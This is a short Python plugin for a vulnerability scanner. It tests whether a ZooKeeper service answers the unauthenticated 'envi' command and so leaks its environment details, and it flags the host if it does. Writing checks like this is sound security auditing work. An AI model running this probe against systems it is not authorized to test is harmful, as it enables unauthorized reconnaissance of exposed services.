#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: 'orleven'

from lib.utils.connect import open_connection
from script import Script, SERVICE_PORT_MAP

class POC(Script):
    def __init__(self, target=None):
        self.service_type = SERVICE_PORT_MAP.ZOOKEEPER
        self.name = 'zookeeper unauth'
        self.keyword = ['zookeeper', 'unauth']
        self.info = 'Zookeeper unauth'
        self.type = 'unauth'
        self.level = 'medium'
        Script.__init__(self, target=target, service_type=self.service_type)

    async def prove(self):
        reader, writer = await open_connection(self.target_host, self.target_port)
        message = 'envi\r\n'
        writer.write(message.encode())
        data = await reader.read(1024)
        writer.close()
        if 'zookeeper.version' in str(data):
            self.flag = 1
            self.req.append({"info": "info"})
            self.res.append({"info": "zookeeper unauth", 'key': 'envi', "envi": message})